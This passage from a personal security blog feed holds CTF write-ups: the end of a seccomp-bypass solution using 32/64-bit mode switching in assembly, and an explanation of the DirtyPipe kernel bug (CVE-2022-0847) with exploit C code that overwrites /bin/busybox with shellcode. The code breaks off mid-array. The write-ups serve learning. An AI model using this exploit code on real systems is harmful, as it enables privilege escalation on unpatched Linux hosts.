class="hljs-number">0038</span><br> <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x1d</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000003c</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-built_in">exit</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0009</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x1c</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x000000e7</span>  <span class="hljs-keyword">if</span> (A == exit_group) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0010</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00000009</span>  <span class="hljs-keyword">if</span> (A != mmap) <span class="hljs-keyword">goto</span> <span class="hljs-number">0015</span><br> <span class="hljs-number">0011</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000024</span>  A = prot &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-meta"># mmap(addr, len, prot, flags, fd, pgoff)</span><br> <span class="hljs-number">0012</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x1a</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x0</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0013</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000020</span>  A = prot <span class="hljs-meta"># mmap(addr, len, prot, flags, fd, pgoff)</span><br> <span class="hljs-number">0014</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x17</span> <span class="hljs-number">0x18</span> <span class="hljs-number">0x00000002</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-number">0x2</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span> <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0015</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x0000003b</span>  <span class="hljs-keyword">if</span> (A != execve) <span class="hljs-keyword">goto</span> <span class="hljs-number">0020</span><br> <span class="hljs-number">0016</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000014</span>  A = filename &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-meta"># execve(filename, argv, envp)</span><br> <span class="hljs-number">0017</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x15</span> <span class="hljs-number">0x00007ffd</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x7ffd</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0018</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000010</span>  A = filename <span class="hljs-meta"># execve(filename, argv, envp)</span><br> <span class="hljs-number">0019</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x12</span> <span class="hljs-number">0x13</span> <span class="hljs-number">0x20088750</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-number">0x20088750</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span> <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0020</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x12</span> <span class="hljs-number">0x00000002</span>  <span class="hljs-keyword">if</span> (A != open) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0021</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000014</span>  A = filename &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-meta"># open(filename, flags, mode)</span><br> <span class="hljs-number">0022</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x10</span> <span class="hljs-number">0x00000013</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x13</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0023</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000010</span>  A = filename <span class="hljs-meta"># open(filename, flags, mode)</span><br> <span class="hljs-number">0024</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0e</span> <span class="hljs-number">0x37331337</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x37331337</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0025</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000001c</span>  A = flags &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-meta"># open(filename, flags, mode)</span><br> <span class="hljs-number">0026</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0c</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x0</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0027</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000018</span>  A = flags <span class="hljs-meta"># open(filename, flags, mode)</span><br> <span class="hljs-number">0028</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x0a</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-number">0x0</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span> <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0029</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x40000003</span>  <span class="hljs-keyword">if</span> (A != ARCH_I386) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0030</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0031</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A == write) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0032</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x05</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == close) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0033</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  <span class="hljs-keyword">if</span> (A == stat) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0034</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000002d</span>  <span class="hljs-keyword">if</span> (A == recvfrom) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0035</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000005a</span>  <span class="hljs-keyword">if</span> (A == chmod) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0036</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000005b</span>  <span class="hljs-keyword">if</span> (A == fchmod) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0037</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x000000fc</span>  <span class="hljs-keyword">if</span> (A != ioprio_get) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0038</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br> <span class="hljs-number">0039</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL<br></code></pre></td></tr></table></figure><p>open的filename要求的地址变了</p><h3 id="e-machine"><a href="#e-machine" class="headerlink" title="e_machine"></a>e_machine</h3><p>wrapper.py判断32位是用的e_ident，但Linux运行时使用e_machine判断是32位还是64位，所以编一个64位的程序改一下e_ident就行，但这样gdb调不了IDA也反编译不了：）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><code class="hljs assembly">global      _start<br>section     .text exec<br>BITS 32<br><br>    ; align 0x1000<br>vdso_landing:<br>; sysenter will use sysexit to return to some place in vsdo<br>; because is in 32bit, high 32bit will be clear<br>; we setup a soft landing place at the start of elf<br>; then mmap elf to vdso address<br>    times 4096 db 0x90      ; nop padding<br>    pop     ebp<br>    pop     edx<br>    pop     ecx<br>    ret<br><br>    ; lea     esp, [stack]<br>    ; mov     esp, stack<br><br>retf_to_64:<br>    push    0x33            ; cs<br>    push    edi             ; ip<br>    retf                    ; jump to edi (64bit)<br><br>_sysenter:<br>    push    ecx             ; push   ecx<br>    push    edx             ; push   edx<br>    push    ebp             ; push   ebp<br>    mov     ebp, esp<br>    sysenter<br><br>start_32:<br>mmap_elf_to_vdso:<br>    push    0x1000          ; off: 0x1000 : .text start<br>    push    4               ; fd: 4, elf file<br>    push    0x11            ; flags: MAP_FIXED | MAP_SHARED<br>    push    5               ; prot: RX<br>    push    0x4000          ; length: elf size<br>    push    edx             ; addr: vdso return addr &amp;&amp; elf base<br>    mov     ebx, esp<br>    mov     eax, 0x5a       ; mmap<br>    call    _sysenter<br>read_flag:<br>    mov     eax, 3          ; SYS_read (32bit)<br>    mov     ebx, 3          ; fd: flag<br>    mov     ecx, pad    ; buf<br>    mov     edx, 0x1000     ; count<br>    call    _sysenter<br>write_flag_to_stdout:<br>mov     edx, eax        ; count<br>    mov     eax, 4          ; SYS_write (32bit)<br>    mov     ebx, 1          ; fd: STDOUT<br>    mov     ecx, pad    ; buf<br>    call    _sysenter<br>exit_137:<br>    mov     eax, 1          ; SYS_exit (32bit)<br>    mov     ebx, 137        ; error_code<br>    call    _sysenter<br><br>BITS 64<br><br>; copy string at rsi to rdi, no return value<br>strcpy:<br>    cld<br>cpy1:<br>    lodsb<br>    stosb<br>    test al,al<br>    jne cpy1<br>    ret<br><br>retf_to_32:<br>; switch to 32 bit<br>    push    0x23            ; cs<br>    push    rdi             ; ip<br>    retfq                   ; jump to rdi<br><br>_start:<br>find_elf_name:<br>    mov     r13, [rsp+8] ; argv[0]<br><br>; find vdso address on stack<br>    mov rdi, rsp<br>find_vdso_l1:<br>    cmp     QWORD [rdi],0x21<br>    je      find_vdso_l2<br>    add     rdi,0x8<br>    jmp     find_vdso_l1<br>find_vdso_l2: <br>    mov     r15, QWORD [rdi+0x8] ; r15 store vdso address, will be page aligned<br>    mov     rax, r15<br>; search for `syscall; ret` in vdso<br>find_syscall_ret_l1:<br>    cmp    BYTE [rax],0xf<br>    jne    find_syscall_ret_l2<br>    cmp    BYTE [rax+0x1],0x5<br>    jne    find_syscall_ret_l2<br>    cmp    BYTE [rax+0x2],0x31<br>    je     find_syscall_ret_l3<br>find_syscall_ret_l2:<br>    inc    rax<br>    jmp    find_syscall_ret_l1<br>find_syscall_ret_l3:<br>    mov     r14, rax            ; r14: syscall; ret<br><br><br>mmap_flag:<br>    mov rax, 0x9<br>    mov rdi, 0x1337331337<br>    mov rsi, 0x1000<br>    mov rdx, 2<br>    mov r10, 0x22<br>    mov r8, 0<br>    mov r9, 0<br>    call r14 ; call syscall<br>open_flag:<br>    mov     rdi, 0x1337331337    ; ld script will ensure 0x31337 is mapped and RW<br>    lea     rsi, [flag]<br>    call    strcpy<br>    <br>    mov     rdi, 0x1337331337<br>    xor     rsi, rsi<br>    mov     eax, 2<br>    call    r14             ; open(&quot;flag&quot;, 0) -&gt; fd 3<br><br>open_elf:<br>    mov     rdi, 0x1337331337    ; ld script will ensure 0x31337 is mapped and RW<br>    mov     rsi, r13<br>    call    strcpy<br>    <br>    mov     rdi, 0x1337331337<br>    xor     rsi, rsi<br>    mov     eax, 2<br>    call    r14             ; open(&quot;ELF_FILE&quot;, 0) -&gt; fd 4<br>; enter 32 bit<br>    mov     edx, r15d ; clear high 32 bit vdso addr<br>    mov     rsp, stack<br>    mov     rdi, start_32<br>    call    retf_to_32<br><br>flag:       db          &quot;flag&quot;, 0<br>message:    db          &quot;test output!!!!!&quot;, 0<br>sc:         db          0x90, 0x90<br>sc_len:     dq          2<br>section     .bss noexec<br>    align 16<br>pad:        resb        0x1000<br>stack:      resb        0x1000<br></code></pre></td></tr></table></figure><p>filename地址直接mmap了</p><h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ul><li>栈上有什么东西（envp，auxv……），链接装载与库，乐</li><li>程序启动，执行程序的内存映射和权限控制什么的</li><li>系统调用（有点忘了用户态和内核态切换的过程了(ˉ▽ˉ；)…）</li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-0847 DirtyPipe</title>
    <link href="/2024/01/12/CVE-2022-0847-DirtyPipe/"/>
    <url>/2024/01/12/CVE-2022-0847-DirtyPipe/</url>
    
    <content type="html"><![CDATA[<p>DirtyPipe！久仰久仰doge</p><p>用的TPCTF的core的内核，顺带一个water-ker的新做法</p><p>背疼&#x2F;(ㄒoㄒ)&#x2F;~~</p><span id="more"></span><p><strong>影响版本</strong>：&gt;5.8，在5.10.102，5.15.25，5.16.11被修复</p><p>只提一些我觉得要注意的内容</p><h1 id="DirtyPipe"><a href="#DirtyPipe" class="headerlink" title="DirtyPipe"></a>DirtyPipe</h1><p>主要注意往splice往pipe里写的函数copy_page_to_iter_pipe</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">copy_page_to_iter_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page, <span class="hljs-type">size_t</span> offset, <span class="hljs-type">size_t</span> bytes,</span><br><span class="hljs-params"> <span class="hljs-keyword">struct</span> iov_iter *i)</span><br>&#123;<br>    <span class="hljs-comment">// 取offset和pipe_buffer</span><br>off = i-&gt;iov_offset;<br>buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<br><br>    <br>    <span class="hljs-keyword">if</span> (off) &#123;<br>        <span class="hljs-comment">// 是否可以续写（之前已经往pipe里写过这一页的内容，page已经挂上去了）</span><br><span class="hljs-keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) &#123;<br>        <span class="hljs-comment">// 更新pipe_buffer的len和iov_iter的offset，跳至out</span><br>buf-&gt;len += bytes;<br>i-&gt;iov_offset += bytes;<br><span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        <span class="hljs-comment">// 不能续写，取下一个pipe_buffer</span><br>i_head++;<br>buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<br>&#125;<br><span class="hljs-keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// 更新pipe，把page挂上去，更新一系列参数</span><br>buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<br>get_page(page);<br>buf-&gt;page = page;<br>buf-&gt;offset = offset;<br>buf-&gt;len = bytes;<br><br>pipe-&gt;head = i_head + <span class="hljs-number">1</span>;<br>i-&gt;iov_offset = offset + bytes;<br>i-&gt;head = i_head;<br>out:<br>i-&gt;count -= bytes;<br><span class="hljs-keyword">return</span> bytes;<br>&#125;<br></code></pre></td></tr></table></figure><p>大致过程</p><ul><li>判断是否可以续写（同一个page，offset一致）</li><li>不可续写则取下一个pipe_buffer</li><li>把page挂进pipe_buffer，并设置一系列参数，<strong>没有更新flags</strong></li></ul><p>可以通过splice的过程发现</p><ul><li>往pipe中写时并不存在数据的复制，而是直接把page cache对应的page挂进了pipe_buffer</li><li>splice并没有初始化flags</li></ul><p>在water-ker中发现当flags设置了PIPE_BUF_FLAG_CAN_MERGE就可以在pipe_buffer中进行续写，那么如果<strong>splice取到一个残留PIPE_BUF_FLAG_CAN_MERGE标志的pipe_buffer就可以对page cache进行覆写</strong></p><p>利用过程如下</p><ul><li>打开要修改的文件</li><li>先写遍所有的pipe_buffer，再读出所有的pipe_buffer，这样所有的pipe_buffer就都有PIPE_BUF_FLAG_CAN_MERGE标志了</li><li>splice一字节</li><li>然后就可以覆写了</li></ul><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br> <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ATTACK_FILE <span class="hljs-string">&quot;/bin/busybox&quot;</span></span><br> <br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span>* msg)</span><br>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[X] %s\n&quot;</span>, msg);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv, <span class="hljs-type">char</span>** env)</span><br>&#123;<br> <br>        <span class="hljs-type">int</span> fd;<br>        <span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>];<br>        <span class="hljs-type">loff_t</span> offset;<br>        <span class="hljs-type">char</span> buf[PAGE_SIZE];<br> <br>        fd = open(ATTACK_FILE, O_RDONLY);<br>        <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) err_exit(<span class="hljs-string">&quot;Can&#x27;t open target file&quot;</span>);<br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd) &lt; <span class="hljs-number">0</span>) err_exit(<span class="hljs-string">&quot;Can&#x27;t create pipe&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) <span class="hljs-keyword">if</span> (write(pipe_fd[<span class="hljs-number">1</span>], buf, PAGE_SIZE) &lt; <span class="hljs-number">0</span>) err_exit(<span class="hljs-string">&quot;Can&#x27;t write pipe&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) <span class="hljs-keyword">if</span> (read(pipe_fd[<span class="hljs-number">0</span>], buf, PAGE_SIZE) &lt; <span class="hljs-number">0</span>) err_exit(<span class="hljs-string">&quot;Can&#x27;t read pipe&quot;</span>);<br> <br>        offset = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (splice(fd, &amp;offset, pipe_fd[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>) &lt;= <span class="hljs-number">0</span>) err_exit(<span class="hljs-string">&quot;Failed at splice&quot;</span>);<br> <br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> elfcode[] = &#123;<br>            <span class="hljs-comment">/*0x7f,*/</span> <span class="hljs-number">0x45</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x78</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span 